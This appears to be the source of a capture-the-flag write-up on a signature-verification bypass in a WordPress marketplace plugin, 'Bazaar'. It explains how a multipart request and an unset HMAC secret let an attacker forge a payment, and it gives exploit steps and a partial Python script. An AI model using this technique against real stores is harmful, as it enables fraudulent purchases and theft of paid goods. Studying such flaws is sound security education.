#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Bazaar: Authentication Bypass via HMAC Signature Verification Flaw",
    description: "Exploiting improper input handling and weak secret initialization to bypass HMAC signature verification in the Bazaar plugin.",
    date: "2025-12-26",
    order: 20,
  ),
)<frontmatter>

= Bazaar: Authentication Bypass via HMAC Signature Verification Flaw

== Introduction

The `Bazaar` plugin for WordPress implements a custom marketplace with a signature-based payment verification system. However, a combination of improper input handling for `multipart/form-data` requests and a weak default secret allows an unauthenticated attacker to bypass the signature check, simulate a payment, and acquire downloadable products (flags) for free.

== Vulnerability Analysis

The vulnerability arises from two distinct issues: the handling of the raw request body in PHP and the default state of the secret key used for HMAC signatures.

=== Step 1: Input Handling Discrepancy

The plugin retrieves the request payload using `file_get_contents('php://input')` for signature verification, but uses `$_POST` to process the payment data.

```php
function bazaar_handle_purchase_submission()
{
    $payload = file_get_contents('php://input');
    // ...
    $data = [
        'product_id' => isset($_POST['product_id']) ? ... : 0,
        // ...
    ];

    if (verifyHeader($payload, $sig_header, $secret)) {
        $charge = bazaar_simulate_charge_from_cart($data);
    }
    // ...
}
```

In PHP, `php://input` is not available (returns an empty string) when the request `Content-Type` is `multipart/form-data`. However, `$_POST` is still populated. This allows an attacker to send a `multipart/form-data` request where `$payload` is empty string `""`, while effectively supplying the necessary data in `$_POST`.

=== Step 2: Weak Secret Initialization

The signature verification relies on a shared secret stored in the WordPress option `bazaar_secret`.

```php
    if (is_user_logged_in()) {
        $user = get_current_user_id();
        update_option('bazaar_secret', wp_hash_password($user));
    }

    $secret = get_option('bazaar_secret');
```

The secret is only updated if a user is logged in. If no user has ever logged in (or if the attacker attacks before any login event on a fresh instance), `get_option('bazaar_secret')` returns `false` (the default value).

When `false` is passed as the secret key to `hash_hmac`, PHP treats it as an empty string `""`.

=== Step 3: Signature Forgery

The `verifyHeader` function constructs the signed payload as `"$timestamp.$payload"`.

```php
    $signedPayload     = "{$timestamp}.{$payload}";
    $expectedSignature = computeSignature($signedPayload, $secret);
```

By combining Step 1 and Step 2, an attacker can send a `multipart/form-data` request. The `$payload` becomes `""`, and the `$secret` is `""`. The attacker simply needs to compute:

```php
$signature = hash_hmac('sha256', "{$timestamp}.", "");
```

This generates a valid signature that the server accepts, bypassing the security check.

== Exploit

To exploit this, we perform the following steps:

1. **Add Product to Cart:** Use a standard WooCommerce request to add the target product (which contains the flag) to the cart.
2. **Forge Payment Request:** Send a `POST` request to `admin-ajax.php?action=bazaar_process_payment` with:
  - `Content-Type: multipart/form-data` (to empty `php://input`).
  - `X-Signature` header containing a signature of `timestamp.` signed with an empty key.
  - Required fields in the body (`product_id`, `price`, etc.) to satisfy validation.
3. **Retrieve Flag:** The server processes the "payment" and creates an order. We follow the redirect or use the `get_bazaar_order` AJAX action with the order key to retrieve the download link for the flag.

=== Exploit Script

```python
# ... (Adding to cart logic)

# Payload is empty due to multipart/form-data
timestamp = str(int(time.time()))
signature = hmac.new(b"", f"{timestamp}.".encode(), hashlib.sha256).hexdigest()

files = {"dummy": ("dummy.txt", "dummy")} # Forces multipart/form-data

response = session.post(
    f"{URL}/wp-admin/admin-ajax.php?action=bazaar_process_payment",
    headers={"X-Signature": f"t={timestamp}, v1={signature}"},
    data={...},
    files=files
)
```
